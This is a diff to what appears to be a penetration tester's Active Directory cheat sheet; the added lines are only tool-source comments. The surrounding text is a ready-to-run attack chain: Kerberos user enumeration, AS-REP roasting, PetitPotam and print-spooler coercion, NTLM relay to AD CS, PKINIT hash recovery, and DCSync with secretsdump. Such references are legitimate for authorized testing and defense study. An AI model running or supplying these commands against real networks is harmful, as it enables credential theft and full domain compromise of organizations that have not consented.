@@ -204,6 +204,7 @@ Microsoft Windows Kerberos — TCP 88
 nmap -p88 --open --script=krb5-enum-users -Pn -oA Kerberos <ip_address>
 
 # User enum (no creds) + AS-REP roast (no-preauth accounts):
+# UPSTREAM: kerbrute not in apt (see install/offensive-packages.txt); nxc ldap --asreproast covers this too
 kerbrute userenum -d <domain> --dc <ip_address> /usr/share/seclists/Usernames/Names/names.txt
 # companion:gen asreproast-getnpusers
 impacket-GetNPUsers <domain>/ -dc-ip <ip_address> -usersfile users.txt -no-pass
@@ -388,11 +389,12 @@ Coercion -> relay -> domain compromise
 ++++++++++++++++++++++++++++++++++++++++
 # Force a machine (ideally a DC) to auth to you, then relay it:
 impacket-petitpotam <your-ip> <dc-ip>                       # MS-EFSRPC (EfsRpcOpenFileRaw)
-printerbug.py <domain>/<user>:<password>@<dc-ip> <your-ip>  # MS-RPRN spooler (Dementor)
+printerbug.py <domain>/<user>:<password>@<dc-ip> <your-ip>  # MS-RPRN spooler (Dementor); from the krbrelayx apt pkg. coercer (below) is the apt-native multi-vector alt
 coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
 # Relay coerced DC auth to AD CS web enrollment -> DC cert (dirkjanm relay-to-ADCS):
 impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 # DC cert -> DC NT hash via PKINIT, then DCSync:
+# UPSTREAM: gettgtpkinit.py / getnthash.py are PKINITtools (github.com/dirkjanm/PKINITtools) — git clone / pipx, not apt
 python3 gettgtpkinit.py -cert-pem dc.crt -key-pem dc.key -dc-ip <dc-ip> <domain>/'DC$' dc.ccache
 KRB5CCNAME=dc.ccache python3 getnthash.py -k <AS-REP-key> -dc-ip <dc-ip> <domain>/'DC$'
 impacket-secretsdump -hashes :<NThash> <domain>/'DC$'@<dc-ip>
